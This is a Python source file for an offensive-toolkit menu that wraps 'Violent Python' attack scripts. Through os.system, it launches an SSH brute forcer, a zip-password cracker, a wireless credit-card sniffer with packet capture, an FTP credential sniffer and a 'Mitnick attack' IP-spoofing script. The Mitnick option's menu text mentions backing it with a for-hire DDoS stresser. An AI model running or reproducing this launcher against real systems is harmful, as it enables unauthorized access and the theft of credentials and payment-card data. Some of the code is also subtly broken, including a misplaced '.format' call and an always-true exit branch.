import os
import socket
import operator
from termcolor import colored
import sys
import time
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

os.system('cat /root/ArmsCommander/Violent-Python-POCs/banner_VP.txt')

opt_List = [
    '\n\t#0. Main Menu',
    '#1. SSH Server/Client Brute Forcer',
    '#2. Zip File Password Cracker (Better, Kali APT-Repo Alternative)',
    '#3. Wireless Network Credit Card Info Sniffer',
    '#4. Local FTP-Server Credential Sniffer',
    '#5. Exif Data Fetcher',
    '#6. Mitnick Attack Reenactment (WARNING: Requires massive bandwidth by 2017 standards (on the level of a For-Hire DDoS Stresser Service to back you up) and almost zero DDoS mitigation on behalf of the victim)'
    # '#7. Drone Hacking Menu. (This feature is IN-CONSTRUCTION, planning to incorporate Violent Python + DEFCON Presentation, its effectively a Aireplay Attack)'
]

def option_1():
    # usage%prog -H <target host> -u <user> -F <password list>
    target_Host = str(raw_input("Enter the target host IP: "))
    target_Username = str(raw_input("Enter the target Username: "))
    target_Wordlist = str(raw_input("Enter the target Wordlist: "))

    cmd_String = "gnome-terminal -e 'bash -c \"sudo python /root/ArmsCommander/Violent-Python-POCs/sshBrute.py -H {0} -u {1} -F {2}; exec bash\"'".format(
        target_Host,
        target_Username,
        target_Wordlist
    )
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)

    return
def option_2():
    # fcrackzip -v -D -u -p /usr/share/dict/words secret.zip
    locked_Zipfile = str(raw_input("Enter the path of the locked zipfile: "))
    password_Wordlist = str(raw_input("Enter the path of the password wordlist: "))
    cmd_String = "gnome-terminal -e 'bash -c \"sudo fcrackzip -v -D -u -p {0} {1}; exec bash\"'".format(
        password_Wordlist,
        locked_Zipfile
    )
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)
    return
    # '#3. Wireless Network Credit Card Info Sniffer',
def start_monitor_mode():
    monitor_Interface = str(raw_input("Enter your network interface for your External Wireless Card: "))
    start_Airmon_String = "airmon-ng start %s" % monitor_Interface
    monitor_Mode_Device = monitor_Interface + 'mon'
    print colored('Your new monitor device is %s','red','on_white') % monitor_Mode_Device
    os.system(start_Airmon_String)
    option_3()
    return

def start_credit_card_attack():
    # we need two things
    # TCP dump writefile
    # text writefile containing creds
    # /root/ArmsCommander/Violent-Python-POCs/wirelessCreditCardsniffer.py
    # tcp_Dump_PCAP = open("/root/ArmsCommander/logs/creditcard_Pkt_Capture.pcap", 'w')
    timestr = time.strftime("%Y%m%d-%H%M%S")

    basic_Filename = "/root/ArmsCommander/logs/CreditCard_Pkt_Capture_"
    modified_Filename = basic_Filename + timestr + '.pcap'

    monitor_Interface = str(raw_input("Enter your monitor interface: "))
    # stored_Creds_File = str(raw_input("Enter where do you want to store captured creds: "))
    cmd_String = "gnome-terminal -e 'bash -c \"sudo python /root/ArmsCommander/Violent-Python-POCs/wirelessCreditCardsniffer.py -i {0}; exec bash\"'".format(
        monitor_Interface
    )


    tcp_Dump_String = "gnome-terminal -e 'bash -c \"sudo tcpdump -i {0} -w {1}; exec bash\"'".format(
        monitor_Interface,
        modified_Filename
        )
    # cred_Writefile_String = cmd_String + '>> {0}*.txt'.format(
    #     stored_Creds_File
    # )
    # tcpdump -i <interface> -w <dumpfile>
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)
    os.system(tcp_Dump_String)
    # os.system(cred_Writefile_String)
    return

def option_3():
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Put your external wireless card (ARP Injection Capable) into monitor mode',
        '#2. Start the credit card sniffing attack'
    ]
# Don't forget to write output into a text file
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        start_monitor_mode()
    elif opt_Choice == "2":
        start_credit_card_attack()
    else:
        print colored('You have entered a invalid option','red','on_white')
        option_3()
    return
        # '#4. Local FTP-Server Credential Sniffer',

def option_4():
    network_interface = str(raw_input("Enter your network interface: "))
    cmd_String = "gnome-terminal -e 'bash -c \"sudo python /root/ArmsCommander/Violent-Python-POCs/ftp-sniffer.py -i {0}; exec bash\"'".format(
        network_interface
    )
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)
    main()
    return
def option_5():
    # '#5. Exif Data Fetcher',
    target_url = str(raw_input("Enter the URL you want to fetch photo Exif data from: "))
    cmd_String = "gnome-terminal -e 'bash -c \"sudo python /root/ArmsCommander/Violent-Python-POCs/exifFetch.py -u {0}; exec bash\"'".format(
        target_url
    )
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)
    main()

    return
def option_6():
    # '#6. Mitnick Attack Reenactment (WARNING: Requires massive bandwidth by 2017 standards (on the level of a For-Hire DDoS Stresser Service to back you up) and almost zero DDoS mitigation on behalf of the victim)',
    source_SYN = str(raw_input("Enter your LAN network IP (192.168.x.x or 10.0.1.x): "))
    source_Spoof = str(raw_input("Enter the IP of the server you want to spoof (that we are attacking and impersonating): "))
    target_IP = str(raw_input("Enter the target IP that we will trick into connecting back with us: "))
    cmd_String = "gnome-terminal -e 'bash -c \"sudo python /root/ArmsCommander/Violent-Python-POCs/9-mitnickAttack.py -s {0} -S {1} -t {2}; exec bash\"'".format
    (
        source_SYN,
        source_Spoof,
        target_IP
    )
    print colored(cmd_String, 'red', 'on_white')
    os.system(cmd_String)
    main()

    return
def option_7():
    # '#7. Drone Hacking Menu. (This feature is IN-CONSTRUCTION, planning to incorporate Violent Python + DEFCON Presentation, its effectively a Aireplay Attack)',
    print colored('Feature under construction. Sorry this field requires a bit more research, and may be released as a entirely separate toolkit given its huge scope of manufacturers and design','red','on_white')
    main()

    return
def option_8():
    return
def option_9():
    return

def main():
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        os.system('clear')
        option_1()
        main()
        return
    elif opt_Choice == "2":
        os.system('clear')
        option_2()
        main()
        return
    elif opt_Choice == "3":
        os.system('clear')
        option_3()
        main()
        return
    elif opt_Choice == "4":
        os.system('clear')
        option_4()
        main()
        return
    elif opt_Choice == "5":
        os.system('clear')
        option_5()
        main()
        return
    elif opt_Choice == "6":
        os.system('clear')
        option_6()
        main()
        return
    elif opt_Choice == "7":
        os.system('clear')
        # option_7()
        main()
        return
    elif opt_Choice == "8":
        os.system('clear')
        # option_8()
        main()
        return
    elif opt_Choice == "9":
        os.system('clear')
        # option_9()
        main()
        return
    elif opt_Choice == "0":
        os.system('clear')
        main()
    elif KeyboardInterrupt:
        exit(0)
    else:
        print colored('You have entered a invalid option', 'red', 'on_white')
        main()
    return
main()
